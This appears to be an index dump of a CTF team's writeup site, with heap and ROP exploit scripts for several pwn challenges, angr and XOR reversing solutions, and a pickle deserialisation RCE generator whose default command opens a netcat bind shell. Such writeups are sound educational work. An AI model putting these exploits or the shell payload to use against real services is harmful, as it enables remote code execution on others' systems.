Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) => system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed. Exploit from pwn import * p = process(\"./easy\",env = {\"LD_PRELOAD\" : \"./libc-2.31.so\"}) p.recvuntil(\"Here is your gift:\") leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info(\"libc_start = \" + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter(\"Input your message:\",fake_tcache) p.sendafter(\"Where to write?:\",p64(tls_tcache)) p.sendafter(\"Any last message?:\",\"/bin/sh\\x00\"+p64(system)) p.interactive()","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#easywrite","text":"The past weekend I played N1CTF along with my teammates, I ended up spending most of the time in EasyWrite and Signin. In this writeup I\u2019ll be explaining about my approach for the EasyWrite, so let\u2019s get started!","title":"EasyWrite"},{"location":"pwning/N1CTF20/easywrite/#initial-click","text":"All the useful mitigation are enabled other than FORTIFY. Also, the libc version required is libc-2.31. In a nutshell, the binary does the follows: Gives us the libc leak directly We can input 0x299 bytes which is stored on the heap [chunk1] Asks us to enter an address [addr1] where contents of chunk1 are copied to Allocated a chunk of size 0x30 [chunk2]. We can write 0x2f bytes to this chunk. chunk2 is freed. From this I could deduce that overwriting free_hook could be the key. But it wasn\u2019t really that easy.","title":"Initial Click"},{"location":"pwning/N1CTF20/easywrite/#what-did-not-work","text":"On the first try, I gave addr1 as free_hook_ and the contents of chunk1 as address of system/ shellcode what not. I ended up with a SIGSEV because this was bound not to work as the binary was executing the chunk1 address and NX was enabled. I couldn\u2019t find any other targets for a long while. Another thing to try out was the controlling tcache structure because we could utilize the write happening on chunk2. Basically, we had to control malloc to help us in getting an arbitrary write. How about getting an allocation on free_hook_ and then overwriting it to get a shell? Not that easy.","title":"What did not work?"},{"location":"pwning/N1CTF20/easywrite/#crux-controlling-tcache","text":"We know that it\u2019s the tcache_perthread_struct (stored on the heap) which kind of keeps a track of the count of chunks are present in the bin and also which one to be recycled on the next call. But in the present scenario we cannot control it because we do not have any way to get heap leaks but we have the libc leaks. Is there any way to control this region if we are armed only with libc leaks? I found a mmap\u2019d address which stores the pointer to the [tcache_perthread structure] -0x10 address. If we could overwrite this address with a chunk1 which has our fake tcache_structure (where the next 0x30 size chunk to be recycled is our free_hook_) then we could get the desired arbitrary write. In my understanding this mmap region is the global Tcache pointer which stores the pointer to the tcache structure (one stored on heap). More details can be found on another writeup on the same which gives a detailed understanding: https://ctftime.org/writeup/24295 .","title":"Crux: Controlling Tcache"},{"location":"pwning/N1CTF20/easywrite/#what-happened-next","text":"Unfortunately, I was not able to complete the challenge during the CTF. Here, none of the one_gadgets come to handy so one must overwrite free_hook_ with system but then it would call free(system) => system(system) which is really not what we desire. My teammate and I did a lot of tries on this but found it out very late that one could get the arbitrary write at free_hook -0x8 and overwrite it with \u201c/bin/sh\\x00\u201d + libc_system_address. Nevertheless, this was a fun challenge as I really learned something new. Also, we must learn to read the source code when all the doors seem to be closed.","title":"What happened next?"},{"location":"pwning/N1CTF20/easywrite/#exploit","text":"from pwn import * p = process(\"./easy\",env = {\"LD_PRELOAD\" : \"./libc-2.31.so\"}) p.recvuntil(\"Here is your gift:\") leak = int(p.recvline().strip(),16) print(hex(leak)) libc_start = leak - 0x08ec50 log.info(\"libc_start = \" + hex(libc_start)) system = libc_start + 0x055410 free_hook = libc_start + 0x00000000001eeb28 tls_tcache = libc_start + 0x1f34f0 fake_tcache = p64(0x0000000100000000) + p64(0)0x82+p64(0)+ p64(free_hook-0x8) p.sendafter(\"Input your message:\",fake_tcache) p.sendafter(\"Where to write?:\",p64(tls_tcache)) p.sendafter(\"Any last message?:\",\"/bin/sh\\x00\"+p64(system)) p.interactive()","title":"Exploit"},{"location":"pwning/ShakitCTF21/intro/","text":"ShaktiCTF April 2021 Birdie Singal dROPper Returning2 Cache7","title":"ShaktiCTF April 2021"},{"location":"pwning/ShakitCTF21/intro/#shaktictf-april-2021","text":"Birdie Singal dROPper Returning2 Cache7","title":"ShaktiCTF April 2021"},{"location":"pwning/ShakitCTF21/returning2/","text":"ShaktiCTF'21: Returning 2 Author: Shruti (@rudyerudite) This was a fairly beginner friendly challenge with a clear 120-byte overflow. We also see an alloca function which is used to allocate space on the stack. I gave an allocation of -40 so that I get the allocation at RBP. Note that PIE is diasbled here. By using ROPgadget tool we can find the required ROP gadgets for crafting the exploit payload. As '/bin/sh' cannot be found in the binary and nor we can write it at .bss, thus we have to find and address in binary with permissions rw . I chose to overwrite an address in the .data section. You can see the permissions of different sections in the binary by executing vmmap in GDB and finding the required address. Thus, I used the mov QWORD PTR [rdi],rax gadget with rax having the string '/bin/sh' and rdi pointing to the address 0x601040 . Next, we can do the execve syscall. Here's the final exploit for the challenge: from pwn import * r = process(\"./chall\") pop_rax = p64(0x000000000040079a) pop_rdx = p64(0x0000000000400788) pop_rdi = p64(0x000000000040077f) pop_rsi = p64(0x0000000000400791) mov = p64(0x400774) syscall = p64(0x00000000004007a3) exp = 'a'*0x8 exp += pop_rdi + p64(0x0000000000601040) exp += pop_rax + \"/bin/sh\\x00\" exp += mov exp += pop_rsi + p64(0) exp += pop_rdx + p64(0) exp += pop_rax + p64(0x3b) exp += syscall exp += p64(0x000000000040059e) print(len(exp)) r.sendline(str(-40)) r.sendlineafter(\"text:\\n\",exp) r.interactive()","title":"ShaktiCTF'21: Returning 2"},{"location":"pwning/ShakitCTF21/returning2/#shaktictf21-returning-2","text":"Author: Shruti (@rudyerudite) This was a fairly beginner friendly challenge with a clear 120-byte overflow. We also see an alloca function which is used to allocate space on the stack. I gave an allocation of -40 so that I get the allocation at RBP. Note that PIE is diasbled here. By using ROPgadget tool we can find the required ROP gadgets for crafting the exploit payload. As '/bin/sh' cannot be found in the binary and nor we can write it at .bss, thus we have to find and address in binary with permissions rw . I chose to overwrite an address in the .data section. You can see the permissions of different sections in the binary by executing vmmap in GDB and finding the required address. Thus, I used the mov QWORD PTR [rdi],rax gadget with rax having the string '/bin/sh' and rdi pointing to the address 0x601040 . Next, we can do the execve syscall. Here's the final exploit for the challenge: from pwn import * r = process(\"./chall\") pop_rax = p64(0x000000000040079a) pop_rdx = p64(0x0000000000400788) pop_rdi = p64(0x000000000040077f) pop_rsi = p64(0x0000000000400791) mov = p64(0x400774) syscall = p64(0x00000000004007a3) exp = 'a'*0x8 exp += pop_rdi + p64(0x0000000000601040) exp += pop_rax + \"/bin/sh\\x00\" exp += mov exp += pop_rsi + p64(0) exp += pop_rdx + p64(0) exp += pop_rax + p64(0x3b) exp += syscall exp += p64(0x000000000040059e) print(len(exp)) r.sendline(str(-40)) r.sendlineafter(\"text:\\n\",exp) r.interactive()","title":"ShaktiCTF'21: Returning 2"},{"location":"pwning/VolgaCTF20/notepad/","text":"Notepad-- This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY. Reversing The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit > The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook \"aaaaaaa\" [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit > This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab->size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on! Vulnerability and the exploit Getting the leaks As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using! Overwriting the free_hook The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts(\"You've reached the limit for notebooks! Delete some of the older once first!\"); v1 = nb_ctr++; v2 = (char *)&table + 2072 * v1; printf(\"Enter notebook name: \"); return __isoc99_scanf(\"%s\", v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook->number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs->data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!! Exploit Code from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter('>','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter('>','l') def dele_note(idx): r.sendlineafter('>','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter('>','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter('>','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter('>','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter('>','l') def update_tab(idx,name,length,data): r.sendlineafter('>','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter('>','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter('>','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#notepad-","text":"This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY.","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#reversing","text":"The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit > The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook \"aaaaaaa\" [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit > This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab->size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on!","title":"Reversing"},{"location":"pwning/VolgaCTF20/notepad/#vulnerability-and-the-exploit","text":"","title":"Vulnerability and the exploit"},{"location":"pwning/VolgaCTF20/notepad/#getting-the-leaks","text":"As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using!","title":"Getting the leaks"},{"location":"pwning/VolgaCTF20/notepad/#overwriting-the-free_hook","text":"The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts(\"You've reached the limit for notebooks! Delete some of the older once first!\"); v1 = nb_ctr++; v2 = (char *)&table + 2072 * v1; printf(\"Enter notebook name: \"); return __isoc99_scanf(\"%s\", v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook->number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs->data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!!","title":"Overwriting the free_hook"},{"location":"pwning/VolgaCTF20/notepad/#exploit-code","text":"from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter('>','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter('>','l') def dele_note(idx): r.sendlineafter('>','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter('>','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter('>','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter('>','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter('>','l') def update_tab(idx,name,length,data): r.sendlineafter('>','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter('>','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter('>','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Exploit Code"},{"location":"pwning/tamuCTF/lottery/","text":"Lottery Description : Attack the binary and get the flag! We can connect with : openssl s_client -connect tamuctf.com:443 -servername lottery -quiet The first thing to do here might be to check for file info. lottery: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped * Since it is statically linked, the possibility of a ret2libc attack is eliminated. * Another look into checksec would reveal that NX is enabled. * With NX enabled, we may not be able to inject a shellcode either. Initially, while running the program, we are prompted with three options, enter numbers, check numbers and enter name. However a look into check_numbers() in gdb reveals that entering the correct numbers is not enough to print the flag. However we can see that ask_name() contains gets. Making use of this vulnerability we can make a syscall. Disasssembly of ask_name : ```0x0000000000401470 <+0>: push rbp 0x0000000000401471 <+1>: xor eax,eax 0x0000000000401473 <+3>: sub rsp,0x40 0x0000000000401477 <+7>: mov rbp,rsp 0x000000000040147a <+10>: mov rdi,rbp 0x000000000040147d <+13>: call 0x401b34 0x0000000000401482 <+18>: mov rsi,rbp 0x0000000000401485 <+21>: lea rdi,[rip+0x7bad] # 0x409039 0x000000000040148c <+28>: xor eax,eax 0x000000000040148e <+30>: call 0x401bd3 0x0000000000401493 <+35>: add rsp,0x40 0x0000000000401497 <+39>: pop rbp 0x0000000000401498 <+40>: ret The buffer size defined is 0x48 bytes, but since gets is used, there is no limit to our input. To do the syscall, we can make use of ROPgadgets and the following code : # Python script : from pwn import * p = remote('localhost', 4444) buf = 'a'*0x48 syscall = p64(0x00000000004016f9) pop_rax = p64(0x000000000040100b) pop_rdi = p64(0x401253) pop_rsi = p64(0x4018ad) pop_rdx = p64(0x0000000000401255) mov_qword_ptr_rdi_rax = p64(0x401f37) buf += pop_rax + p64(0x0068732f6e69622f) + pop_rdi + p64(0x40c730) + mov_qword_ptr_rdi_rax buf += pop_rax + p64(0x3b) buf += pop_rdi + p64(0x40c730) buf += pop_rsi + p64(0x00) + pop_rdx + p64(0x00) + syscall p.recvuntil(\"Action: \") p.sendline('3') p.sendline(buf) p.interactive() ```","title":"Lottery"},{"location":"pwning/tamuCTF/lottery/#lottery","text":"Description : Attack the binary and get the flag! We can connect with : openssl s_client -connect tamuctf.com:443 -servername lottery -quiet The first thing to do here might be to check for file info. lottery: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped * Since it is statically linked, the possibility of a ret2libc attack is eliminated. * Another look into checksec would reveal that NX is enabled. * With NX enabled, we may not be able to inject a shellcode either. Initially, while running the program, we are prompted with three options, enter numbers, check numbers and enter name. However a look into check_numbers() in gdb reveals that entering the correct numbers is not enough to print the flag. However we can see that ask_name() contains gets. Making use of this vulnerability we can make a syscall. Disasssembly of ask_name : ```0x0000000000401470 <+0>: push rbp 0x0000000000401471 <+1>: xor eax,eax 0x0000000000401473 <+3>: sub rsp,0x40 0x0000000000401477 <+7>: mov rbp,rsp 0x000000000040147a <+10>: mov rdi,rbp 0x000000000040147d <+13>: call 0x401b34 0x0000000000401482 <+18>: mov rsi,rbp 0x0000000000401485 <+21>: lea rdi,[rip+0x7bad] # 0x409039 0x000000000040148c <+28>: xor eax,eax 0x000000000040148e <+30>: call 0x401bd3 0x0000000000401493 <+35>: add rsp,0x40 0x0000000000401497 <+39>: pop rbp 0x0000000000401498 <+40>: ret The buffer size defined is 0x48 bytes, but since gets is used, there is no limit to our input. To do the syscall, we can make use of ROPgadgets and the following code : # Python script : from pwn import * p = remote('localhost', 4444) buf = 'a'*0x48 syscall = p64(0x00000000004016f9) pop_rax = p64(0x000000000040100b) pop_rdi = p64(0x401253) pop_rsi = p64(0x4018ad) pop_rdx = p64(0x0000000000401255) mov_qword_ptr_rdi_rax = p64(0x401f37) buf += pop_rax + p64(0x0068732f6e69622f) + pop_rdi + p64(0x40c730) + mov_qword_ptr_rdi_rax buf += pop_rax + p64(0x3b) buf += pop_rdi + p64(0x40c730) buf += pop_rsi + p64(0x00) + pop_rdx + p64(0x00) + syscall p.recvuntil(\"Action: \") p.sendline('3') p.sendline(buf) p.interactive() ```","title":"Lottery"},{"location":"pwning/tamuCTF/tictactoe/","text":"tictactoe Challenge Summary The challenge was based on the python deserialisation bug. THis challenge was very similar to a challenge fromTamuCTF from the previous year involving he cpickle module instead of pickle which is used in the challenge here. The challenge allowed us to play the tictactoe gane and win 133713371337 times to get the flag in the straightforward way but our goal is to somehow trick the load progress function to fetch the flag from the pickle.dumps()' import Pickle import sys import base64 DEFAULT_COMMAND = \"netcat -c '/bin/bash -i' -l -p 4444\" COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND class PickleRce(object): def __reduce__(self): import os return (os.system,(COMMAND,)) print base64.b64encode(Pickle.dumps(PickleRce())) We passed cat flag.txt as commandline argument to this python script which generates the base64 encoded pickle dump for ourinput which the server reads and executes in our challenge. The base64 dump we get is sent to the sever and we get the flag!! flag: gigem{d0esnt_looK_lik3_5t4rs_t0_M3} Resources https://medium.com/hackstreetboys/tamuctf-2019-pwn-write-up-4-6-of-6-174e41a4a9ca","title":"tictactoe"},{"location":"pwning/tamuCTF/tictactoe/#tictactoe","text":"","title":"tictactoe"},{"location":"pwning/tamuCTF/tictactoe/#challenge-summary","text":"The challenge was based on the python deserialisation bug. THis challenge was very similar to a challenge fromTamuCTF from the previous year involving he cpickle module instead of pickle which is used in the challenge here. The challenge allowed us to play the tictactoe gane and win 133713371337 times to get the flag in the straightforward way but our goal is to somehow trick the load progress function to fetch the flag from the pickle.dumps()' import Pickle import sys import base64 DEFAULT_COMMAND = \"netcat -c '/bin/bash -i' -l -p 4444\" COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND class PickleRce(object): def __reduce__(self): import os return (os.system,(COMMAND,)) print base64.b64encode(Pickle.dumps(PickleRce())) We passed cat flag.txt as commandline argument to this python script which generates the base64 encoded pickle dump for ourinput which the server reads and executes in our challenge. The base64 dump we get is sent to the sever and we get the flag!! flag: gigem{d0esnt_looK_lik3_5t4rs_t0_M3}","title":"Challenge Summary"},{"location":"pwning/tamuCTF/tictactoe/#resources","text":"https://medium.com/hackstreetboys/tamuctf-2019-pwn-write-up-4-6-of-6-174e41a4a9ca","title":"Resources"},{"location":"reversing/intro/","text":"Reversing Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme TamuCTF21 setecAstronomy simple_cipher","title":"Reversing"},{"location":"reversing/intro/#reversing","text":"","title":"Reversing"},{"location":"reversing/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category.","title":"Introduction"},{"location":"reversing/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis - By @sandrabeme APLab:Statistics - By @sandrabeme APLab:English - By @sandrabeme APLab:ComputerScience - By @namithas123 DarkCTF Jack - By @sandrabeme TamuCTF21 setecAstronomy simple_cipher","title":"The contents of this repo"},{"location":"reversing/ByteBandits20/auto_bot/","text":"Auto_bot Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil(\"\\n\") flag.write(str(o)) out = base64.b64decode(o) n=open(\"new\",\"wb\") n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project(\"./new\") initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b\"good job\" in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/auto_bot/#auto_bot","text":"Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil(\"\\n\") flag.write(str(o)) out = base64.b64decode(o) n=open(\"new\",\"wb\") n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project(\"./new\") initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b\"good job\" in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/baby_rust/","text":"Baby_Rust Analysing it dynamically gets us to xoring instructions: d =\"adhmp`badO|sL}JuvvFmiui{@IO}QQVR\" k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/ByteBandits20/baby_rust/#baby_rust","text":"Analysing it dynamically gets us to xoring instructions: d =\"adhmp`badO|sL}JuvvFmiui{@IO}QQVR\" k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/DarkCTF/Jack/","text":"Emojis - Misc HSCTF2020 Description We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script. Solution Script import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV(\"\\n\")]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i>=32) state.solver.add(i<=127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print(\"FAILURE\") Output n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#description","text":"We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script.","title":"Description"},{"location":"reversing/DarkCTF/Jack/#solution-script","text":"import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV(\"\\n\")]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i>=32) state.solver.add(i<=127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print(\"FAILURE\")","title":"Solution Script"},{"location":"reversing/DarkCTF/Jack/#output","text":"n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Output"},{"location":"reversing/HSCTF7/APLabEnglish/","text":"APLab:English Description Another java Reversing Challenge. We are given a java file which is to be reversed. Solution s=\"1dd3|y_3tttb5g\\`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 